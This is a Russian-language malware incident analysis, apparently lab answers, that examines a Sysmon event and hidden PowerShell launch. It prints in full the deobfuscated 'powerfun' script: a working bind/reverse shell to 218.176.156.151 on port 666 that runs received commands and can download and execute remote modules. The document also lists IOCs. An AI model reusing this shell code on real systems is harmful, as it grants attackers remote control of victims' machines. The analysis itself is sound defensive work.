### Ответы на вопросы с учетом деобфусцированного скрипта

#### 1. Родительский процесс
Родительским процессом, порождающим активность в PowerShell, является `cmd.exe`. Это видно из следующей части события Sysmon:
```xml
<Data Name="ParentProcessId">6004</Data>
<Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
<Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe"</Data>
```

#### 2. Event ID события в Sysmon
Event ID у данного события Sysmon равен `1`.

#### 3. Видимость окна PowerShell
Пользователь компьютера не увидит окно PowerShell, так как оно запущено с параметром `-w hidden`, что означает, что окно будет скрыто.

#### 4. Обфускация кода
Анализируя PowerShell-логи и Sysmon-событие, можно заметить, что использованы следующие механизмы обфускации:
1. **Base64-кодирование**: Данные закодированы в Base64, что делает их менее читаемыми.
2. **Gzip-сжатие**: Данные также сжаты с использованием Gzip, что усложняет их анализ.

#### 5. Описание вредоносного скрипта
Вредоносный скрипт создает TCP-соединение (или слушает на порту) для удаленного выполнения команд через PowerShell. В зависимости от параметров, он может устанавливать обратное соединение с указанным сервером или слушать на локальном порту для входящих подключений. Скрипт позволяет выполнять команды на удаленной машине и возвращает результаты выполнения, а также может загружать и исполнять дополнительные модули.

### Деобфусцированный скрипт

```powershell
function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}

function powerfun 
{ 
    Param( 
        [String]$Command,
        [String]$Sslcon,
        [String]$Download
    ) 
    Process {
        $modules = @()  
        if ($Command -eq "bind")
        {
            $listener = [System.Net.Sockets.TcpListener]666
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 
        if ($Command -eq "reverse")
        {
            $client = New-Object System.Net.Sockets.TCPClient("218.176.156.151",666)
        }

        $stream = $client.GetStream()

        if ($Sslcon -eq "true") 
        {
            $sslStream = New-Object System.Net.Security.SslStream($stream, $false, ({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
            $sslStream.AuthenticateAsClient("218.176.156.151", $null, "tls12", $false)
            $stream = $sslStream 
        }

        [byte[]]$bytes = 0..20000 | %{0}
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes, 0, $sendbytes.Length)

        if ($Download -eq "true")
        {
            $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
            $stream.Write($sendbytes, 0, $sendbytes.Length)
            ForEach ($module in $modules)
            {
                (Get-Webclient).DownloadString($module) | Invoke-Expression
            }
        }

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)

            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
}

powerfun -Command bind
```

### Индикаторы компрометации (IOC)

1. **Процесс PowerShell, запущенный с параметром `-w hidden`**:
   ```plaintext
   CommandLine: powershell.exe -nop -w hidden -noni -ep bypass ...
   ```
2. **IP-адрес и порт для обратного соединения**:
   ```plaintext
   IP: 218.176.156.151
   Port: 666
   ```